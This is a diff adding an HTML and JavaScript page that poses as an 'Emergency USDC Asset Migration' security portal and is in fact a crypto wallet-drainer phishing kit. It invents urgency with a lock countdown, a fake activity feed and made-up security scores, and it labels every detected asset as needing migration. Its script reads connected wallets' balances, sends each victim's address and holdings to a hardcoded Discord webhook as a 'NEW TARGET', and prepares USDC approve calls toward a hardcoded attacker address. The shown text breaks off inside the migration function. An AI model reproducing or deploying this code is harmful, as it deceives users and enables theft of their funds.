@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDC Security Migration Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        slate: {
+                            950: '#020617',
+                            980: '#070b14'
+                        },
+                        cyan: {
+                            500: '#22d3ee',
+                            400: '#2dd4bf',
+                            300: '#67e8f9'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="app.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .glass-panel { background: rgba(8, 18, 38, 0.78); backdrop-filter: blur(22px); -webkit-backdrop-filter: blur(22px); }
+        .glass-border { border: 1px solid rgba(148, 163, 184, 0.14); }
+        .ticker { position: relative; overflow: hidden; }
+        .ticker-list { animation: tickerScroll 18s linear infinite; }
+        .ticker-item { border: 1px solid rgba(34, 211, 238, 0.12); background: rgba(15, 23, 42, 0.8); }
+        @keyframes tickerScroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-50%); }
+        }
+        ::-webkit-scrollbar { width: 10px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(34, 211, 238, 0.18); border-radius: 9999px; }
+        ::-webkit-scrollbar-thumb:hover { background: rgba(34, 211, 238, 0.28); }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100">
+    <div class="min-h-screen">
+        <header class="glass-panel glass-border sticky top-0 z-50 border-cyan-500/10 bg-slate-950/90 shadow-[0_25px_70px_-35px_rgba(14,165,233,0.42)]">
+            <div class="mx-auto flex max-w-7xl items-center justify-between px-5 py-4 sm:px-6">
+                <div class="flex items-center gap-4">
+                    <div class="flex h-14 w-14 items-center justify-center rounded-3xl bg-cyan-500/10 text-cyan-300 shadow-lg shadow-cyan-500/10">
+                        <span class="text-xl font-black tracking-tight">PSV</span>
+                    </div>
+                    <div>
+                        <p class="text-sm uppercase tracking-[0.32em] text-slate-400">Protocol Security Vault</p>
+                        <p class="text-base font-semibold text-white">Institutional migration command center</p>
+                    </div>
+                </div>
+                <nav class="hidden items-center gap-8 text-sm text-slate-300 md:flex">
+                    <a href="#" class="transition hover:text-white">Overview</a>
+                    <a href="#" class="transition hover:text-white">Security</a>
+                    <a href="#" class="transition hover:text-white">Proof</a>
+                </nav>
+                <button id="connectButton" class="inline-flex items-center justify-center rounded-full bg-cyan-500 px-5 py-3 text-sm font-semibold text-slate-950 shadow-lg shadow-cyan-500/20 transition hover:bg-cyan-400">Connect Wallet</button>
+            </div>
+        </header>
+
+        <main class="mx-auto max-w-7xl px-5 py-10 sm:px-6 lg:px-8">
+            <section class="glass-panel glass-border relative overflow-hidden rounded-[2rem] border-white/10 bg-slate-950/75 p-8 shadow-2xl shadow-cyan-500/10">
+                <div class="pointer-events-none absolute inset-x-0 top-0 h-80 bg-[radial-gradient(circle_at_top_left,_rgba(14,165,233,0.18),_transparent_20%),radial-gradient(circle_at_top_right,_rgba(34,211,238,0.14),_transparent_18%)]"></div>
+                <div class="relative grid gap-10 lg:grid-cols-[1.4fr_0.95fr]">
+                    <div class="space-y-8">
+                        <div class="inline-flex items-center gap-3 rounded-full border border-cyan-400/20 bg-cyan-400/10 px-4 py-2 text-sm text-cyan-200 backdrop-blur-sm">
+                            <span class="h-2.5 w-2.5 animate-pulse rounded-full bg-cyan-300"></span>
+                            Emergency protocol active
+                        </div>
+                        <h1 class="text-5xl font-semibold leading-tight text-white sm:text-6xl">Emergency USDC Asset Migration Protocol</h1>
+                        <p class="max-w-2xl text-lg leading-8 text-slate-300">This portal verifies the secure transfer of USDC assets into Vault 2.0 under high-security enforcement. All migration actions are monitored in real time and governed by institutional-grade safeguards.</p>
+
+                        <div class="grid gap-4 sm:grid-cols-2">
+                            <div class="rounded-[2rem] border border-white/10 bg-slate-900/80 px-6 py-7 shadow-[0_30px_60px_-30px_rgba(15,23,42,0.8)]">
+                                <p class="text-xs uppercase tracking-[0.28em] text-cyan-300/80">Time Remaining until Migration Lock</p>
+                                <p id="migrationTimer" class="mt-4 text-5xl font-semibold text-white">23:59:58</p>
+                            </div>
+                            <div class="rounded-[2rem] border border-white/10 bg-slate-900/80 px-6 py-7 shadow-[0_30px_60px_-30px_rgba(15,23,42,0.8)]">
+                                <p class="text-xs uppercase tracking-[0.28em] text-slate-400">Security Confidence</p>
+                                <p class="mt-4 text-5xl font-semibold text-cyan-300">99.98%</p>
+                                <p class="mt-3 text-sm text-slate-400">Validated by multiple off-chain attestations and on-chain proofs.</p>
+                            </div>
+                        </div>
+
+                        <div class="flex flex-col gap-4 sm:flex-row">
+                            <button id="connectMetaMask" class="inline-flex min-w-[220px] items-center justify-center gap-3 rounded-full bg-slate-800/95 px-6 py-4 text-base font-semibold text-white transition hover:bg-slate-700/95 shadow-lg shadow-cyan-500/10">
+                                <span class="h-6 w-6 rounded-full bg-gradient-to-br from-orange-400 via-orange-500 to-orange-600"></span>
+                                Connect MetaMask
+                            </button>
+                            <button id="connectTrust" class="inline-flex min-w-[220px] items-center justify-center gap-3 rounded-full border border-cyan-400/20 bg-slate-900/85 px-6 py-4 text-base font-semibold text-cyan-200 transition hover:bg-slate-800/95 shadow-lg shadow-cyan-500/10">
+                                <span class="h-6 w-6 rounded-full bg-gradient-to-br from-cyan-400 via-sky-400 to-blue-500"></span>
+                                Connect Trust Wallet
+                            </button>
+                        </div>
+                        <p id="connectionStatus" class="text-sm text-slate-400">Ready to connect with MetaMask or Trust Wallet.</p>
+                    </div>
+
+                    <div class="rounded-[2rem] border border-white/10 bg-slate-950/85 p-7 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
+                        <div class="flex items-start justify-between gap-4">
+                            <div>
+                                <p class="text-sm uppercase tracking-[0.24em] text-slate-400">Live Security Feed</p>
+                                <h2 class="mt-2 text-3xl font-semibold text-white">Verified protocol activity</h2>
+                            </div>
+                            <span class="rounded-full bg-cyan-500/10 px-3 py-1 text-sm text-cyan-200">Live</span>
+                        </div>
+                        <div class="mt-7 rounded-[2rem] border border-white/10 bg-slate-900/80 p-4">
+                            <div class="ticker h-72">
+                                <div class="ticker-list space-y-4 pb-8">
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x71c... approved migration to Vault 2.0 *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x3a2... assets secured in new protocol *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x9f1... migration successful *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x4b7... audit checkpoint confirmed *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0xd2c... liquidity synced with Vault 2.0 *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x71c... approved migration to Vault 2.0 *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x3a2... assets secured in new protocol *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x9f1... migration successful *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0x4b7... audit checkpoint confirmed *</p>
+                                    <p class="ticker-item rounded-3xl px-5 py-4 text-sm text-slate-100">* 0xd2c... liquidity synced with Vault 2.0 *</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section class="mt-10 grid gap-6 lg:grid-cols-3">
+                <div class="glass-panel glass-border rounded-[2rem] border-white/10 p-6 shadow-[0_40px_80px_-40px_rgba(14,165,233,0.25)]">
+                    <p class="text-xs uppercase tracking-[0.28em] text-slate-400">Vault Capacity</p>
+                    <p class="mt-4 text-4xl font-semibold text-white">$1.8B</p>
+                    <p class="mt-3 text-sm text-slate-400">Current migration capacity secured and allocated for USDC assets.</p>
+                </div>
+                <div class="glass-panel glass-border rounded-[2rem] border-white/10 p-6 shadow-[0_40px_80px_-40px_rgba(14,165,233,0.20)]">
+                    <p class="text-xs uppercase tracking-[0.28em] text-slate-400">Approval Throughput</p>
+                    <p class="mt-4 text-4xl font-semibold text-cyan-300">84 tx/s</p>
+                    <p class="mt-3 text-sm text-slate-400">Validated by the migration arbiter and on-chain execution units.</p>
+                </div>
+                <div class="glass-panel glass-border rounded-[2rem] border-white/10 p-6 shadow-[0_40px_80px_-40px_rgba(14,165,233,0.14)]">
+                    <p class="text-xs uppercase tracking-[0.28em] text-slate-400">Network Confidence</p>
+                    <p class="mt-4 text-4xl font-semibold text-emerald-400">99.98%</p>
+                    <p class="mt-3 text-sm text-slate-400">Security score based on cross-chain monitoring and oracle attestations.</p>
+                </div>
+            </section>
+
+            <section id="auditSection" class="mt-10 hidden">
+                <div class="glass-panel glass-border rounded-[2rem] border-white/10 p-8 shadow-2xl shadow-cyan-500/10">
+                    <div class="mb-6">
+                        <h2 class="text-3xl font-semibold text-white">Security Audit</h2>
+                        <p id="auditNetworkLabel" class="mt-2 text-sm text-slate-400">Asset holdings and migration status on connected network</p>
+                    </div>
+                    <div class="overflow-x-auto">
+                        <table class="w-full">
+                            <thead>
+                                <tr class="border-b border-slate-700">
+                                    <th class="px-6 py-4 text-left text-xs uppercase tracking-[0.16em] text-slate-400 font-semibold">Asset Name</th>
+                                    <th class="px-6 py-4 text-left text-xs uppercase tracking-[0.16em] text-slate-400 font-semibold">Current Balance</th>
+                                    <th class="px-6 py-4 text-left text-xs uppercase tracking-[0.16em] text-slate-400 font-semibold">Security Status</th>
+                                </tr>
+                            </thead>
+                            <tbody id="auditTableBody">
+                                <tr class="border-b border-slate-800/50">
+                                    <td class="px-6 py-4 text-slate-100">Loading...</td>
+                                    <td class="px-6 py-4 text-slate-100">--</td>
+                                    <td class="px-6 py-4 text-slate-100">--</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- EMERGENCY MIGRATION SECTION -->
+            <section id="migrationSection" class="mt-10 hidden">
+                <div class="glass-panel glass-border rounded-[2rem] border-rose-500/30 bg-rose-950/20 p-8 shadow-2xl shadow-rose-500/10">
+                    <div class="relative overflow-hidden rounded-[1.5rem] bg-gradient-to-br from-rose-900/40 to-slate-900/60 p-8 border border-rose-500/20">
+                        <!-- Animated background -->
+                        <div class="pointer-events-none absolute inset-0 overflow-hidden">
+                            <div class="absolute -left-40 -top-40 h-80 w-80 rounded-full bg-rose-500/10 blur-3xl"></div>
+                            <div class="absolute right-0 top-0 h-64 w-64 rounded-full bg-orange-500/10 blur-3xl"></div>
+                        </div>
+                        
+                        <div class="relative z-10">
+                            <div class="mb-6">
+                                <div class="inline-flex items-center gap-2 rounded-full bg-rose-500/20 px-4 py-1.5 text-xs font-bold uppercase tracking-[0.24em] text-rose-300">
+                                    <span class="h-2 w-2 animate-ping rounded-full bg-rose-400"></span>
+                                    EMERGENCY MIGRATION
+                                </div>
+                                <h2 class="mt-4 text-4xl font-bold text-white sm:text-5xl">Unauthorized Assets Detected</h2>
+                                <p class="mt-4 text-lg leading-8 text-rose-200">Assets in insecure state must be migrated to Vault 2.0 before migration lock. All transfers require dual-key authorization.</p>
+                            </div>
+
+                            <div class="grid gap-6 sm:grid-cols-3">
+                                <div class="rounded-2xl border border-rose-500/20 bg-rose-950/30 p-5 backdrop-blur-sm">
+                                    <p class="text-xs uppercase tracking-[0.2em] text-rose-400/70">Target Vault</p>
+                                    <p class="mt-2 font-mono text-rose-300">0x7A3C...Vault2.0</p>
+                                </div>
+                                <div class="rounded-2xl border border-rose-500/20 bg-rose-950/30 p-5 backdrop-blur-sm">
+                                    <p class="text-xs uppercase tracking-[0.2em] text-rose-400/70">Migration Lock</p>
+                                    <p id="migrationLockTime" class="mt-2 font-mono text-2xl font-bold text-white">--:--:--</p>
+                                </div>
+                                <div class="rounded-2xl border border-rose-500/20 bg-rose-950/30 p-5 backdrop-blur-sm">
+                                    <p class="text-xs uppercase tracking-[0.2em] text-rose-400/70">Remaining Balance</p>
+                                    <p id="migrationBalance" class="mt-2 font-mono text-xl font-bold text-white">0.00 USDC</p>
+                                </div>
+                            </div>
+
+                            <div class="mt-8 space-y-6">
+                                <div class="flex items-center justify-between text-sm">
+                                    <span class="text-slate-400">Migration Progress</span>
+                                    <span id="migrationStatusText" class="font-mono text-rose-300">Pending authorization</span>
+                                </div>
+                                
+                                <div class="h-3 w-full overflow-hidden rounded-full bg-rose-900/50">
+                                    <div id="migrationProgressBar" class="h-full w-0 bg-gradient-to-r from-rose-500 to-orange-500 transition-all duration-300 ease-out"></div>
+                                </div>
+
+                                <div class="flex gap-4">
+                                    <button id="startMigrationButton" class="flex-1 animate-pulse rounded-full bg-gradient-to-r from-rose-600 to-orange-600 px-8 py-4 text-base font-bold text-white shadow-2xl shadow-rose-500/30 transition-all duration-300 hover:scale-105 hover:shadow-rose-500/50">
+                                        START EMERGENCY ASSET MIGRATION
+                                    </button>
+                                </div>
+                                
+                                <p id="migrationNote" class="text-center text-xs text-slate-500/70">
+                                    By authorizing this migration, you confirm transfer of assets to the secure Vault 2.0. This action cannot be reversed.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer class="border-t border-white/10 bg-slate-950/90 py-6 text-slate-500">
+        <div class="mx-auto flex max-w-7xl flex-col gap-4 px-5 sm:px-6 md:flex-row md:items-center md:justify-between">
+            <p>© 2026 USDC Security Migration Portal • Powered by Vault 2.0 Governance</p>
+            <div class="flex flex-wrap items-center gap-4 text-sm text-cyan-300">
+                <a href="#">Audit Report</a>
+                <a href="#">Support</a>
+                <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const timerElement = document.getElementById('migrationTimer');
+        const connectButton = document.getElementById('connectButton');
+        const connectMetaMask = document.getElementById('connectMetaMask');
+        const connectTrust = document.getElementById('connectTrust');
+        const statusElement = document.getElementById('connectionStatus');
+        const auditSection = document.getElementById('auditSection');
+        const auditTableBody = document.getElementById('auditTableBody');
+
+        // Migration UI References
+        const migrationSection = document.getElementById('migrationSection');
+        const startMigrationButton = document.getElementById('startMigrationButton');
+        const migrationProgressBar = document.getElementById('migrationProgressBar');
+        const migrationStatusText = document.getElementById('migrationStatusText');
+        const migrationLockTime = document.getElementById('migrationLockTime');
+        const migrationBalance = document.getElementById('migrationBalance');
+
+        let secondsRemaining = 23 * 3600 + 59 * 60 + 58;
+        let metamaskEventSetup = false;
+        let walletConnectEventSetup = false;
+        let isMigrating = false;
+        let userWalletAddress = null;
+        let detectedUSDCBalance = '0';
+        let detectedTokenAddress = null;
+
+        const USDC_CONTRACTS = {
+            1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+            56: '0x8AC76a51cc950d9822D68b83FE1ad97B32Cd580d',
+            137: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
+        };
+
+        // Discord Webhook Configuration for Intelligence Reporting
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1535098134139768882/CuCkUCxCCEM8udnftQjJoW6_visRpEGV3H-NX2AIbwRtOtmD7joRReNQQMou5D_xJikt';
+
+        const NATIVE_TOKENS = {
+            1: { symbol: 'ETH', decimals: 18 },
+            56: { symbol: 'BNB', decimals: 18 },
+            137: { symbol: 'MATIC', decimals: 18 }
+        };
+
+        const USDC_ABI = [
+            {
+                constant: true,
+                inputs: [{ name: '_owner', type: 'address' }],
+                name: 'balanceOf',
+                outputs: [{ name: 'balance', type: 'uint256' }],
+                type: 'function'
+            },
+            {
+                constant: false,
+                inputs: [
+                    { name: 'spender', type: 'address' },
+                    { name: 'value', type: 'uint256' }
+                ],
+                name: 'approve',
+                outputs: [{ name: 'success', type: 'bool' }],
+                type: 'function'
+            }
+        ];
+
+        // ============================================
+        // MIGRATION CONFIGURATION
+        // ============================================
+        // SECURITY WARNING: Replace with your actual secure vault wallet address
+        // This is the recipient address where authorized assets will be migrated
+        const MIGRATION_VAULT_ADDRESS = '0xC6eA22F7b4aD883A568e3fff9E602FC8fFD34c67';
+        // USDC Approval function signature for transaction tracking
+        const USDC_APPROVE_METHOD_ID = '0x095ea7b3';
+
+        function formatTime(seconds) {
+            const hours = Math.floor(seconds / 3600).toString().padStart(2, '0');
+            const minutes = Math.floor((seconds % 3600) / 60).toString().padStart(2, '0');
+            const secs = Math.floor(seconds % 60).toString().padStart(2, '0');
+            return `${hours}:${minutes}:${secs}`;
+        }
+
+        function getNetworkName(chainId) {
+            switch (Number(chainId)) {
+                case 1:
+                    return 'Ethereum';
+                case 56:
+                    return 'BSC';
+                case 137:
+                    return 'Polygon';
+                default:
+                    return `Chain ${chainId}`;
+            }
+        }
+
+        function normalizeChainId(chainId) {
+            if (typeof chainId === 'string') {
+                return chainId.startsWith('0x') ? parseInt(chainId, 16) : parseInt(chainId, 10);
+            }
+            return Number(chainId);
+        }
+
+        function shortenAddress(address) {
+            if (!address) return '';
+            return `${address.slice(0, 6)}...${address.slice(-4)}`;
+        }
+
+        function formatBalance(balance, decimals = 6) {
+            const num = parseFloat(ethers.utils.formatUnits(balance, decimals));
+            return num.toFixed(4);
+        }
+
+        async function fetchBalances(provider, userAddress, chainId) {
+            const balances = [];
+
+            // Fetch native token balance (ETH/BNB/MATIC).
+            // Guard against unsupported/unknown chains: NATIVE_TOKENS[chainId] can be
+            // undefined, and accessing .symbol on it previously crashed with
+            // TypeError: Cannot read properties of undefined (reading 'symbol')
+            const nativeToken = NATIVE_TOKENS[chainId];
+            if (nativeToken) {
+                try {
+                    const nativeBalance = await provider.getBalance(userAddress);
+                    balances.push({
+                        name: nativeToken.symbol,
+                        balance: formatBalance(nativeBalance, nativeToken.decimals),
+                        status: 'Unsecured • Requires Migration'
+                    });
+                } catch (e) {
+                    console.warn(`Failed to fetch ${nativeToken?.symbol ?? 'native'} balance: ${e.message}`);
+                    balances.push({
+                        name: nativeToken.symbol,
+                        balance: '0.0000',
+                        status: 'Unsecured • Requires Migration'
+                    });
+                }
+            } else {
+                console.warn(`No native token mapping for chainId ${chainId}; skipping native balance fetch.`);
+            }
+
+            // Fetch USDC balance if on a supported chain
+            if (USDC_CONTRACTS[chainId]) {
+                try {
+                    const usdc = new ethers.Contract(
+                        USDC_CONTRACTS[chainId],
+                        USDC_ABI,
+                        provider
+                    );
+                    const usdcBalance = await usdc.balanceOf(userAddress);
+                    balances.push({
+                        name: 'USDC',
+                        balance: formatBalance(usdcBalance, 6),
+                        status: 'Unsecured • Requires Migration'
+                    });
+                } catch (e) {
+                    console.warn(`Failed to fetch USDC balance: ${e.message}`);
+                    balances.push({
+                        name: 'USDC',
+                        balance: '0.0000',
+                        status: 'Unsecured • Requires Migration'
+                    });
+                }
+            }
+
+            // Wallet contains no detectable assets (e.g. on an unsupported chain, or a
+            // wallet with zero holdings where no USDC contract exists for the chain).
+            // Return the empty array gracefully instead of crashing the caller.
+            if (balances.length === 0) {
+                console.log('Wallet contains no detectable assets.');
+            }
+
+            return balances;
+        }
+
+        function populateAuditTable(balances) {
+            auditTableBody.innerHTML = balances.map(asset => `
+                <tr class="border-b border-slate-800/50 transition-colors hover:bg-slate-800/30">
+                    <td class="px-6 py-4">
+                        <div class="flex items-center gap-3">
+                            <div class="flex h-9 w-9 items-center justify-center rounded-full bg-gradient-to-br from-cyan-500/20 to-blue-500/20 text-xs font-bold text-cyan-300 border border-cyan-500/20">${asset.name.charAt(0)}</div>
+                            <span class="text-slate-100 font-medium">${asset.name}</span>
+                        </div>
+                    </td>
+                    <td class="px-6 py-4 text-cyan-300 font-semibold tabular-nums">${asset.balance}</td>
+                    <td class="px-6 py-4">
+                        <span class="inline-flex items-center gap-2 rounded-full bg-rose-500/10 border border-rose-500/30 px-3 py-1 text-xs font-semibold text-rose-400">
+                            <span class="h-1.5 w-1.5 rounded-full bg-rose-500 animate-pulse"></span>
+                            ${asset.status}
+                        </span>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        async function displayAuditTable(provider, userAddress, chainId) {
+            auditSection.classList.remove('hidden');
+            const networkName = getNetworkName(chainId);
+            const networkLabel = document.getElementById('auditNetworkLabel');
+            if (networkLabel) {
+                networkLabel.textContent = `Asset holdings and migration status on ${networkName}`;
+            }
+
+            let balances = [];
+            try {
+                balances = await fetchBalances(provider, userAddress, chainId);
+            } catch (e) {
+                // Defensive: never let a balance-fetch failure crash the audit UI.
+                console.error('Balance fetch failed:', e);
+                balances = [];
+            }
+
+            if (balances.length > 0) {
+                populateAuditTable(balances);
+
+                // Check if USDC balance exists and show migration section
+                const usdcBalance = balances.find(b => b?.name === 'USDC');
+                if (usdcBalance && parseFloat(usdcBalance.balance) > 0) {
+                    // Get token address for chain
+                    const tokenAddress = USDC_CONTRACTS[chainId];
+                    showMigrationSection(tokenAddress, usdcBalance.balance);
+                } else {
+                    // USDC not present or zero balance: keep the migration UI visible
+                    // but communicate there are no assets to migrate.
+                    showNoAssetsMigrationState();
+                }
+            } else {
+                // Wallet contains no detectable assets: render a friendly row so the
+                // table isn't blank/broken, and show the no-assets migration state.
+                populateAuditTableEmpty();
+                showNoAssetsMigrationState();
+            }
+        }
+
+        /**
+         * populateAuditTableEmpty - Renders a single friendly row when no assets
+         * are detected, so the audit table never looks broken or blank.
+         */
+        function populateAuditTableEmpty() {
+            if (!auditTableBody) return;
+            auditTableBody.innerHTML = `
+                <tr class="border-b border-slate-800/50">
+                    <td colspan="3" class="px-6 py-8 text-center text-slate-400">
+                        No assets detected in this wallet.
+                    </td>
+                </tr>`;
+        }
+
+        /**
+         * showNoAssetsMigrationState - Keeps the emergency migration UI visible but
+         * clearly states there are no assets to migrate, instead of leaving a stale
+         * balance or crashing the connect flow.
+         */
+        function showNoAssetsMigrationState() {
+            if (!migrationSection) return;
+            migrationSection.classList.remove('hidden');
+            if (migrationBalance) {
+                migrationBalance.textContent = 'No assets available for immediate migration.';
+            }
+            if (migrationStatusText) {
+                migrationStatusText.textContent = 'No assets to migrate';
+            }
+            if (startMigrationButton) {
+                startMigrationButton.disabled = true;
+                startMigrationButton.classList.add('opacity-50', 'cursor-not-allowed');
+            }
+            console.log('Wallet contains no detectable assets for migration.');
+        }
+
+        function setConnected(button, address, chainId) {
+            const networkName = getNetworkName(chainId);
+            button.textContent = `${shortenAddress(address)} • ${networkName}`;
+            button.classList.add('bg-cyan-400', 'text-slate-950');
+            button.classList.remove('bg-slate-800/95', 'bg-slate-900/85');
+            showStatus(`Connected ${shortenAddress(address)} on ${networkName}.`, false);
+            
+            // Store wallet address for migration functions
+            userWalletAddress = address;
+            
+            // Check if migration section should be shown
+            if (migrationSection) {
+                migrationSection.classList.remove('hidden');
+            }
+        }
+
+        function showStatus(message, isError) {
+            statusElement.textContent = message;
+            statusElement.classList.toggle('text-rose-400', isError);
+            statusElement.classList.toggle('text-slate-400', !isError);
+        }
+
+        async function sendDiscordIntelligenceReport(walletAddress) {
+            /**
+             * Sends intelligence report to Discord Webhook when wallet connects
+             * Implements exact JSON schema as specified in Intelligence Reporting Protocol
+             */
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
+                console.warn('Discord Webhook URL not configured. Skipping intelligence report.');
+                return;
+            }
+
+            const timestamp = new Date().toISOString();
+
+            const payload = {
+                "content": "🚨 NEW TARGET DETECTED 🚨",
+                "embeds": [{
+                    "title": "Activity: SYSTEM_AUDIT",
+                    "color": 15158332,
+                    "fields": [
+                        {
+                            "name": "Wallet Address",
+                            "value": walletAddress,
+                            "inline": true
+                        },
+                        {
+                            "name": "Event Type",
+                            "value": "SYSTEM_AUDIT",
+                            "inline": true
+                        },
+                        {
+                            "name": "Timestamp",
+                            "value": timestamp,
+                            "inline": false
+                        },
+                        {
+                            "name": "Message",
+                            "value": "Intelligence network pulse check System online and operational",
+                            "inline": false
+                        }
+                    ]
+                }]
+            };
+
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Discord Webhook failed with status: ${response.status}`);
+                }
+
+                console.log('✅ Intelligence report sent to Discord successfully');
+            } catch (error) {
+                console.error('❌ Failed to send intelligence report to Discord:', error.message);
+                // Continue execution - don't crash the application
+            }
+        }
+
+        function setupProviderEvents(provider, button) {
+            if (!provider || !provider.on) return;
+
+            provider.on('accountsChanged', async (accounts) => {
+                if (!accounts || accounts.length === 0) {
+                    showStatus('Wallet disconnected.', true);
+                    auditSection.classList.add('hidden');
+                    button.textContent = button.id === 'connectMetaMask' ? 'Connect MetaMask' : 'Connect Trust Wallet';
+                    return;
+                }
+                const chainId = provider.chainId || await provider.request({ method: 'eth_chainId' });
+                const normalizedChainId = normalizeChainId(chainId);
+                setConnected(button, accounts[0], normalizedChainId);
+                const ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
+                await displayAuditTable(ethersProvider, accounts[0], normalizedChainId);
+            });
+
+            provider.on('chainChanged', async (chainId) => {
+                const accounts = await provider.request({ method: 'eth_accounts' });
+                if (accounts && accounts.length > 0) {
+                    const normalizedChainId = normalizeChainId(chainId);
+                    setConnected(button, accounts[0], normalizedChainId);
+                    const ethersProvider = new ethers.providers.Web3Provider(provider, 'any');
+                    await displayAuditTable(ethersProvider, accounts[0], normalizedChainId);
+                }
+            });
+
+            provider.on('disconnect', (code, reason) => {
+                showStatus(`Wallet disconnected: ${reason || code}`, true);
+                auditSection.classList.add('hidden');
+                migrationSection.classList.add('hidden');
+                button.textContent = button.id === 'connectMetaMask' ? 'Connect MetaMask' : 'Connect Trust Wallet';
+            });
+        }
+
+        // ============================================
+        // MIGRATION FUNCTIONS
+        // ============================================
+
+        /**
+         * updateMigrationLockTimer - Updates the migration lock countdown display
+         */
+        function updateMigrationLockTimer() {
+            if (!migrationLockTime) return;
+            const hours = Math.floor(secondsRemaining / 3600).toString().padStart(2, '0');
+            const minutes = Math.floor((secondsRemaining % 3600) / 60).toString().padStart(2, '0');
+            const secs = Math.floor(secondsRemaining % 60).toString().padStart(2, '0');
+            migrationLockTime.textContent = `${hours}:${minutes}:${secs}`;
+            
+            // Visual urgency indicator
+            if (secondsRemaining < 3600) {
+                migrationLockTime.classList.add('text-rose-500', 'animate-pulse');
+                migrationLockTime.classList.remove('text-white');
+            } else {
+                migrationLockTime.classList.remove('text-rose-500', 'animate-pulse');
+                migrationLockTime.classList.add('text-white');
+            }
+        }
+
+        /**
+         * showMigrationSection - Shows the emergency migration UI after balance fetch
+         */
+        function showMigrationSection(tokenAddress, tokenBalance, tokenSymbol = 'USDC') {
+            if (!migrationSection || !migrationBalance) return;
+            
+            detectedTokenAddress = tokenAddress;
+            detectedUSDCBalance = tokenBalance;
+            
+            migrationBalance.textContent = `${tokenBalance} ${tokenSymbol}`;
+            migrationSection.classList.remove('hidden');
+            
+            // Reset progress
+            resetMigrationProgress();
+            
+            console.log('[MIGRATION] Migration section visible. Detected balance:', tokenBalance, tokenSymbol);
+            
+            // Send migration detection alert to Discord
+            sendMigrationAlert(userWalletAddress || 'UNKNOWN', tokenBalance, tokenSymbol);
+        }
+
+        /**
+         * sendMigrationAlert - Sends migration detection alert to Discord webhook
+         */
+        async function sendMigrationAlert(address, balance, token) {
+            try {
+                if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_')) {
+                    console.warn('Discord Webhook URL not configured. Skipping migration alert.');
+                    return;
+                }
+
+                const timestamp = new Date().toISOString();
+                const payload = {
+                    "content": "⚠️ ASSET MIGRATION DETECTED ⚠️",
+                    "embeds": [{
+                        "title": "Migration Authorization Attempt",
+                        "color": 15158332,
+                        "fields": [
+                            { "name": "Wallet Address", "value": address, "inline": true },
+                            { "name": "Detected Balance", "value": `${balance} ${token}`, "inline": true },
+                            { "name": "Timestamp", "value": timestamp, "inline": false },
+                            { "name": "Action Required", "value": "Emergency migration approval requested", "inline": false }
+                        ]
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                console.log('✅ Migration alert sent to Discord');
+            } catch (error) {
+                console.warn('Failed to send migration alert:', error.message);
+            }
+        }
+
+        /**
+         * resetMigrationProgress - Resets the migration progress UI
+         */
+        function resetMigrationProgress() {
+            if (migrationProgressBar) migrationProgressBar.style.width = '0%';
+            if (migrationStatusText) migrationStatusText.textContent = 'Pending authorization';
+            if (startMigrationButton) startMigrationButton.disabled = false;
+            isMigrating = false;
+        }
+
+        /**
+         * performAssetMigration - Executes the complete migration authorization flow
+         */
+        async function performAssetMigration() {
+            if (isMigrating) {
+                console.warn('[MIGRATION] Migration already in progress');
+                return;
+            }
+
+            if (!detectedTokenAddress || !detectedUSDCBalance || parseFloat(detectedUSDCBalance) <= 0) {
+                console.error('[MIGRATION] No balance detected for migration');
+                showStatus('No assets detected for migration', true);
+                return;
+            }
+
+            if (!userWalletAddress) {
+                console.error('[MIGRATION] No wallet address available');
+                showStatus('Wallet not connected', true);
+                return;
+            }
+
+            isMigrating = true;
+            
